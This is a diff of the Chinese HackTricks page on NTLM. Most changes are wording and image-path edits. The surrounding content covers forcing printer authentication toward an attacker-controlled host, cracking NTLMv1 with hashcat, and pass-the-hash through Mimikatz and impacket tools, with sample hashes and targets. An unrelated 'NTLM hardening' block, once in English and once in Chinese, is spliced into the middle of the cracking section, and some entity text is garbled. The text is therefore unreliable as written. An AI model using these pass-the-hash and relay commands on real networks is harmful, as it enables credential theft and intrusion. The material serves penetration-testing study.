@@ -1,15 +1,15 @@
 # NTLM
 
 {% hint style="success" %}
-学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>支持 HackTricks</summary>
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
@@ -17,9 +17,9 @@
 
 ## 基本信息
 
-在运行 **Windows XP 和 Server 2003** 的环境中，使用 LM（Lan Manager）哈希，尽管广泛认为这些哈希容易被攻破。特定的 LM 哈希 `AAD3B435B51404EEAAD3B435B51404EE` 表示未使用 LM，代表一个空字符串的哈希。
+在 **Windows XP 和 Server 2003** 运行的环境中，使用 LM（Lan Manager）哈希，尽管广泛认为这些哈希容易被攻破。特定的 LM 哈希 `AAD3B435B51404EEAAD3B435B51404EE` 表示未使用 LM，代表空字符串的哈希。
 
-默认情况下，**Kerberos** 认证协议是主要使用的方法。NTLM（NT LAN Manager）在特定情况下介入：缺少 Active Directory、域不存在、由于配置不当导致 Kerberos 故障，或在尝试使用 IP 地址而非有效主机名进行连接时。
+默认情况下，**Kerberos** 认证协议是主要使用的方法。NTLM（NT LAN Manager）在特定情况下介入：缺少 Active Directory、域不存在、由于配置不当导致 Kerberos 故障，或当尝试使用 IP 地址而非有效主机名进行连接时。
 
 网络数据包中存在 **"NTLMSSP"** 头部信号表示 NTLM 认证过程。
 
@@ -70,7 +70,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t RE
 
 ### 本地 NTLM 认证方案
 
-认证与之前提到的 **相同，但** **服务器**知道尝试在 **SAM** 文件中进行身份验证的 **用户的哈希**。因此，服务器将 **自行检查** 用户是否可以进行身份验证，而不是询问域控制器。
+认证与前面提到的 **相同，但** **服务器**知道尝试在 **SAM** 文件中进行身份验证的 **用户的哈希**。因此，服务器将 **自行检查** 用户是否可以进行身份验证，而不是询问域控制器。
 
 ### NTLMv1 挑战
 
@@ -91,8 +91,8 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t RE
 如今，发现配置了不受限制委派的环境变得越来越少，但这并不意味着您不能 **滥用配置的打印后台处理程序服务**。
 
 您可以滥用您在 AD 上已经拥有的一些凭据/会话，以 **请求打印机对某个您控制的主机进行身份验证**。然后，使用 `metasploit auxiliary/server/capture/smb` 或 `responder`，您可以 **将认证挑战设置为 1122334455667788**，捕获认证尝试，如果使用 **NTLMv1** 进行，您将能够 **破解它**。\
-如果您使用 `responder`，您可以尝试 \*\*使用标志 `--lm` \*\* 来尝试 **降级** **认证**。\
-_请注意，对于此技术，认证必须使用 NTLMv1 进行（NTLMv2 无效）。_
+如果您使用 `responder`，您可以尝试 **使用标志 `--lm`** 来尝试 **降级** **认证**。\
+&#xNAN;_&#x4E;请注意，对于此技术，认证必须使用 NTLMv1 进行（NTLMv2 无效）。_
 
 请记住，打印机在认证期间将使用计算机帐户，而计算机帐户使用 **长且随机的密码**，您 **可能无法使用常见的字典破解**。但是 **NTLMv1** 认证 **使用 DES**（[更多信息在这里](./#ntlmv1-challenge)），因此使用一些专门用于破解 DES 的服务，您将能够破解它（例如，您可以使用 [https://crack.sh/](https://crack.sh) 或 [https://ntlmv1.com/](https://ntlmv1.com)）。
 
@@ -135,34 +135,39 @@ NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 
 ## Overview
 
-NTLM (NT LAN Manager) 是一种身份验证协议，主要用于 Windows 系统。虽然它在某些情况下仍然被使用，但由于其安全性较低，建议在可能的情况下禁用 NTLM。
+NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is important to understand the vulnerabilities associated with NTLM and how to mitigate them.
 
-## 目的
+## Recommendations
 
-本指南的目的是帮助用户理解 NTLM 的风险，并提供一些硬化 Windows 系统以减少 NTLM 使用的建议。
+1. **Disable NTLM Authentication**: If possible, disable NTLM authentication in your environment. Use Kerberos instead.
+2. **Limit NTLM Usage**: If NTLM must be used, limit its usage to specific applications and services.
+3. **Monitor NTLM Traffic**: Regularly monitor NTLM traffic for any unusual activity that may indicate a security breach.
 
-## 风险
+## Conclusion
 
-- NTLM 容易受到中间人攻击。
-- NTLM 不支持强密码策略。
-- NTLM 可能导致凭据泄露。
+By following these recommendations, you can significantly reduce the risk associated with NTLM in your Windows environment.
+```
+
+# Windows Hardening: NTLM
+
+## 概述
+
+NTLM（NT LAN Manager）是微软的一套安全协议，提供用户身份验证、完整性和机密性。了解与NTLM相关的漏洞及其缓解方法非常重要。
 
 ## 建议
 
-1. 禁用 NTLM 身份验证。
-2. 使用 Kerberos 作为身份验证协议。
-3. 定期审计 NTLM 使用情况。
+1. **禁用NTLM身份验证**：如果可能，在您的环境中禁用NTLM身份验证。改用Kerberos。
+2. **限制NTLM使用**：如果必须使用NTLM，请将其使用限制在特定应用程序和服务中。
+3. **监控NTLM流量**：定期监控NTLM流量，以发现任何可能表明安全漏洞的异常活动。
 
-## 参考
+## 结论
 
-- [Microsoft NTLM Documentation](https://docs.microsoft.com/en-us/windows/win32/secmgr/ntlm)
-- [NTLM Security Risks](https://www.example.com/ntlm-security-risks)
-```
+通过遵循这些建议，您可以显著降低Windows环境中与NTLM相关的风险。
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
-运行 hashcat（通过像 hashtopolis 这样的工具进行分布式处理效果最佳），否则这将需要几天时间。
+运行 hashcat（通过像 hashtopolis 这样的工具进行分布式处理是最佳选择），否则这将需要几天时间。
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
@@ -205,7 +210,7 @@ NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 
 ## Pass-the-Hash
 
-**一旦您拥有受害者的哈希值**，您可以使用它来**冒充**受害者。\
+**一旦您拥有受害者的哈希值**，您可以用它来**冒充**受害者。\
 您需要使用一个**工具**，该工具将**使用**该**哈希**进行**NTLM 身份验证**，**或者**您可以创建一个新的**sessionlogon**并将该**哈希**注入到**LSASS**中，这样当任何**NTLM 身份验证被执行**时，该**哈希将被使用**。最后一个选项就是 mimikatz 所做的。
 
 **请记住，您也可以使用计算机帐户执行 Pass-the-Hash 攻击。**
@@ -227,7 +232,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm
 
 您可以在这里下载[Windows的impacket二进制文件](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。
 
-* **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
+* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 * **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
 * **atexec.exe**（在这种情况下，您需要指定一个命令，cmd.exe和powershell.exe无效以获得交互式shell）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
 * 还有更多Impacket二进制文件...
@@ -291,16 +296,16 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 **您可以使用** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
 
 {% hint style="success" %}
-学习和实践AWS黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习和实践GCP黑客攻击：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践AWS黑客攻击：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践GCP黑客攻击：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>支持HackTricks</summary>
 
 * 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github库提交PR来分享黑客技巧。
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**上关注我们。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub库提交PR来分享黑客技巧。
 
 </details>
 {% endhint %}
